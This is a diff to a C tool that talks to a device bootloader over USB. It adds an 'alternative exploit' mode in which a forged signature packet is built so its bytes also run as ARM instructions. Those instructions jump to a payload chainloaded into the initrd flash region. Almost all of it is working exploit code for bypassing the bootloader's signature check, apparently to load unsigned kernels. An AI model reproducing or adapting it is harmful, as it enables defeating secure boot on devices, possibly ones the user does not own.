@@ -25,6 +25,7 @@
 
 #define TIMEOUT 1000
 
+#define BUFFER_SIZE 4096
 #define MAXIMUM_VMLINUX_PAYLOAD (0x200000 - 16 - 2048)
 /* A little bit more than the minimum required on bootloader 24655.
  * If you have different bootloader and the device crashes after loading
@@ -32,16 +33,27 @@
  * The maximum is 479.
  */
 #define EXPLOIT_INITRD_ZERO_BUFFERS (260)
+#define ALT_ENTRY_POINT (0x320000 + 16 + EXPLOIT_INITRD_ZERO_BUFFERS * BUFFER_SIZE)
 
 static unsigned char exploit_signature[2048] =
 {
-    0x89, /* RFC4880 packet type: signature, old format, two byte length follows */
-    0x00, 0x00, /* Packet length, ignored by bootloader */
+    /* In alternative exploit mode the signature itself gets executed */
+    /* 88 00 03 05   streq r0,[r3,#-0x88] */
+    0x88, /* RFC4880 packet type: signature, old format, two byte length follows */
+    0x00, /* Packet length, ignored by bootloader */
     0x03, /* Signature version 3 */
     0x05, /* Must be 5 according to RFC4880 */
+    /* 00 00 00 00   addeq r0, r0, r0 */
     0x00, /* RFC4880 signature type: binary document */
-    0x00, 0x00, 0x00, 0x00, /* 4-byte creation time, can be anything */
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Key ID of the signer, ignored by bootloader */
+    /* 4-byte creation time, 8-byte Key ID of the signer, ignored by bootloader*/
+    0x00, 0x00, 0x00,
+    /* 04 F0 1F E5   ldr pc, [pc, #-4] */
+    0x04, 0xF0, 0x1F, 0xE5,
+    (ALT_ENTRY_POINT & 0x000000FF),
+    (ALT_ENTRY_POINT & 0x0000FF00) >> 8,
+    (ALT_ENTRY_POINT & 0x00FF0000) >> 16,
+    (ALT_ENTRY_POINT & 0xFF000000) >> 24,
+    0x00,
     0x01, /* Public Key algorithm: RSA (Encrypt or Sign) */
     0x02, /* Hash type: SHA1 */
     0x00, 0x00, /* Left 16 bits of signed hash message, ignored by bootloader */
@@ -87,7 +99,7 @@ static bool bootloader_transfer_files(char **filenames, int n_files)
     struct libusb_device_handle *handle;
     int file_nr;
     int result;
-    unsigned char buf[4096];
+    unsigned char buf[BUFFER_SIZE];
 
     result = libusb_init(NULL);
     if (result < 0)
@@ -181,12 +193,13 @@ static bool bootloader_transfer_files(char **filenames, int n_files)
     return true;
 }
 
-static bool exploit_transfer_data(unsigned char *data, int data_size)
+static bool exploit_transfer_data(unsigned char *data, int data_size,
+                                  unsigned char *initrd_payload, int initrd_payload_size)
 {
     struct libusb_device_handle *handle;
     int i;
     int result;
-    unsigned char buf[4096];
+    unsigned char buf[BUFFER_SIZE];
     unsigned char payload_header[16] =
     {
         0xAA, 0xBB, 0xFF, 0xEE, /* Magic */
@@ -202,10 +215,10 @@ static bool exploit_transfer_data(unsigned char *data, int data_size)
         0xAA, 0xBB, 0xFF, 0xEE, /* Magic */
         0x00, 0x00, 0x44, 0x01, /* Load address for data */
         0xFF, 0xFF, 0xFF, 0xFF, /* Place at initrd flash region */
-        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf)) & 0x000000FF),
-        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf)) & 0x0000FF00) >> 8,
-        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf)) & 0x00FF0000) >> 16,
-        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf)) & 0xFF000000) >> 24,
+        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0x000000FF),
+        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0x0000FF00) >> 8,
+        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0x00FF0000) >> 16,
+        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0xFF000000) >> 24,
     };
 
     result = libusb_init(NULL);
@@ -266,6 +279,23 @@ static bool exploit_transfer_data(unsigned char *data, int data_size)
         printf(".");
         fflush(stdout);
     }
+    if (initrd_payload_size > 0)
+    {
+        printf("\nSending initrd payload to device\n");
+        for (i = 0; i < initrd_payload_size; i += 4096)
+        {
+            int remaining = initrd_payload_size - i;
+            int to_send = (remaining > 4096) ? 4096 : remaining;
+            if (transmit_data(handle, 1, &initrd_payload[i], to_send) != 0)
+            {
+                libusb_close(handle);
+                libusb_exit(NULL);
+                return false;
+            }
+            printf(".");
+            fflush(stdout);
+        }
+    }
     printf("\nDone\n");
 
     /* Notify device that all files are sent */
@@ -284,7 +314,7 @@ static bool exploit_transfer_data(unsigned char *data, int data_size)
     return true;
 }
 
-static bool exploit_load(char *filename)
+static bool exploit_load(char *filename, bool alternative)
 {
     bool result;
     unsigned char *buf;
@@ -330,7 +360,16 @@ static bool exploit_load(char *filename)
 
     memcpy(&buf[buf_len - sizeof(exploit_signature)], exploit_signature, sizeof(exploit_signature));
 
-    result = exploit_transfer_data(buf, buf_len);
+    if (alternative)
+    {
+        /* payload in initrd image, chainloaded from exploit signature */
+        result = exploit_transfer_data(exploit_signature, sizeof(exploit_signature), buf, file_len);
+    }
+    else
+    {
+        /* payload in kernel image */
+        result = exploit_transfer_data(buf, buf_len, NULL, 0);
+    }
 
     fclose(f);
     free(buf);
@@ -559,18 +598,19 @@ int main(int argc, char **argv)
         static struct option long_options[] =
         {
             /* These options set a flag. */
-            {"exploit",    required_argument, 0, 'e'},
-            {"bootloader", required_argument, 0, 'b'},
-            {"linux",      required_argument, 0, 'l'},
-            {"check",      required_argument, 0, 'c'},
-            {"srrgen",     required_argument, 0, 's'},
-            {"forge",      required_argument, 0, 'f'},
+            {"exploit",             required_argument, 0, 'e'},
+            {"alternative-exploit", required_argument, 0, 'a'},
+            {"bootloader",          required_argument, 0, 'b'},
+            {"linux",               required_argument, 0, 'l'},
+            {"check",               required_argument, 0, 'c'},
+            {"srrgen",              required_argument, 0, 's'},
+            {"forge",               required_argument, 0, 'f'},
             {0, 0, 0, 0}
         };
         /* getopt_long stores the option index here. */
         int option_index = 0;
 
-        c = getopt_long(argc, argv, "e:b:l:c:s:f:",
+        c = getopt_long(argc, argv, "e:a:b:l:c:s:f:",
                         long_options, &option_index);
 
         /* Detect the end of the options. */
@@ -580,7 +620,14 @@ int main(int argc, char **argv)
         switch (c)
         {
             case 'e':
-                if (!exploit_load(argv[optind - 1]))
+                if (!exploit_load(argv[optind - 1], false))
+                {
+                    fprintf(stderr, "Failed to transfer payload to bootloader\n");
+                    retval = 1;
+                }
+                break;
+            case 'a':
+                if (!exploit_load(argv[optind - 1], true))
                 {
                     fprintf(stderr, "Failed to transfer payload to bootloader\n");
                     retval = 1;
